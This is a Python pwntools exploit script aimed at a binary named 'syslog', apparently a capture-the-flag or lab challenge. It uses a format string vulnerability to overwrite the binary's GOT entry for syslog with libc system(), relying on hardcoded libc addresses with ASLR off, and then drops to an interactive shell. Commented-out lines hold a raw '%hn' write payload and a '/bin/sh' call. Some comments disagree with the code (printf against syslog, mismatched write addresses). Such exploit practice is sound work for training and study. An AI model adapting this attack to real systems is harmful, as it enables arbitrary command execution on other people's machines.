from pwn import *
from pwnlib.fmtstr import FmtStr, fmtstr_split, fmtstr_payload


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Function to be called by FmtStr
def send_payload(payload):
    io.sendlineafter(b':',b'1')
    io.recvuntil(b'etc.)')
    io.sendlineafter(b':', b'1')
    io.recvuntil(b'syslog')
    io.sendlineafter(b': ',payload)
    # Receive the response
    io.recvuntil(b'choice')
    io.sendlineafter(b':',b'2')
    result = io.recvuntil(b"=")
    return result


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
break vuln
continue
'''.format(**locals())


# Set up pwntools for the correct architecture
exe = './syslog'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'error'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

io = start()

# Found manually (ASLR_OFF)
libc = elf.libc
libc.address = 0x00007f9b95add000  # ldd got_overwrite

# # Find the offset for format string write
format_string = FmtStr(execute_fmt=send_payload)
info("format string offset: %d", format_string.offset)

# Print address to overwrite (printf) and what we want to write (system)
info("address to overwrite (elf.got.syslog): %#x", elf.got.syslog)
info("address to write (libc.functions.system): %#x", libc.symbols.system)

# Overwrite printf() in GOT with Lib-C system()
# Manual, like in notes.txt

format_string.write(0x3bf0,p16(0x9920))
format_string.write(0x3fb2, p16(0x95b2))  # Lower-order


# format_string.write(0x3fb0, p64(0x7f9b95b29920))
# # Or automagically
# format_string.write(elf.got.syslog, libc.symbols.system)

# # Execute the format string writes
format_string.execute_writes()

format_string.write(0x3fb4, p16(0x7f9b))  # Lower-order
format_string.write(0x3fb6, p16(0x0000))  # Higher-order

format_string.execute_writes()
# # Get our flag!
# # io.sendline(b'/bin/sh')

# payload = b'\x20\x99\xb2\x95\x9b\x7f\x00\x00' + \
#           b'\x21\x99\xb2\x95\x9b\x7f\x00\x00' + \
#           b'\x22\x99\xb2\x95\x9b\x7f\x00\x00' + \
#           b'\x23\x99\xb2\x95\x9b\x7f\x00\x00' + \
#           b'%11$hn%12$hn%13$hn%14$hn'

# send_payload(payload)
# print(send_payload(b'/bin/sh'))
io.interactive()
